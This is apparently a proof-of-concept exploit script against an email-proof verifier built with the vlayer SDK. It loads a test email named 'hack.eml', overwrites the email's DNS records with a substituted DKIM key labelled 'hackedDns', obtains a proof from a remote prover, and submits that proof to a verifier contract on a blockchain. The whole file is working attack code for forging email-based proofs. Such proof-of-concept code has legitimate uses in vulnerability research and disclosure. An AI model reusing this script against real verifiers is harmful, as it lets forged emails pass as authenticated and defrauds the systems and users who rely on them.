import fs from "fs";
import { createVlayerClient, preverifyEmail } from "@vlayer/sdk";
import {
  getConfig,
  createContext,
  deployVlayerContracts,
} from "@vlayer/sdk/config";

import proverSpec from "../out/EmailProver.sol/EmailProver";
import verifierSpec from "../out/EmailProofVerifier.sol/EmailProofVerifier";

const mimeEmail = fs.readFileSync("./testdata/hack.eml").toString();

const unverifiedEmail = await preverifyEmail(mimeEmail);
const hackedDns = 'v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCPwsG12awgnJc3oDr984Y5bVhgJ+EPiGlPqGD+IwD/iVz80hI9o3AVfEjmUgHxCToZsuRxs6dez3TDD1wYRiWcNlmgcEy68IxuAf4nAGxmAueSKRYoencKlH5Bn5XDnQDlnZbr7WWsKlBoDfb2lhK+WSxmDm4oo7Zh+qxzh45elwIDAQAB; n=1024,1450901090,1466712290'
unverifiedEmail.dnsRecords = [hackedDns]
// console.log(unverifiedEmail);

const config = getConfig();

const { chain, ethClient, account, proverUrl, confirmations } =
  await createContext(config);

console.log("Proving...");

const vlayer = createVlayerClient({
  url: proverUrl,
});
console.log(proverUrl);
const hash = await vlayer.prove({
  address: "0x7193a412c9bdb388e713e44745331b1369f7b6b4",
  proverAbi: proverSpec.abi,
  functionName: "main",
  chainId: chain.id,
  args: [unverifiedEmail],
});

await new Promise((resolve) => setTimeout(resolve, 10000));

const result = await vlayer.waitForProvingResult(hash);
console.log("Proof:", result[0]);
console.log("Verifying...");

// Save all necessary data
// fs.writeFileSync('./proof_data.json', JSON.stringify({
//   hash: hash,
//   result: result,
//   verifierAddress: "0xa827c4f310f76fb31b2864e3de2ad20f713cd307",
// }, null, 2));
// console.log("Proof data saved to proof_data.json");

console.log("Verifying...");

// const proofData = JSON.parse(fs.readFileSync('./proof_data.json', 'utf8'));
    

await new Promise((resolve) => setTimeout(resolve, 10000));

const txHash = await ethClient.writeContract({
  address: "0xa827c4f310f76fb31b2864e3de2ad20f713cd307",
  abi: verifierSpec.abi,
  functionName: "verify",
  args: result, //proofData.result,
  chain,
  account: account,
});

await new Promise((resolve) => setTimeout(resolve, 10000));

await ethClient.waitForTransactionReceipt({
  hash: txHash,
  confirmations,
  retryCount: 60,
  retryDelay: 1000,
});

console.log("Verified!");
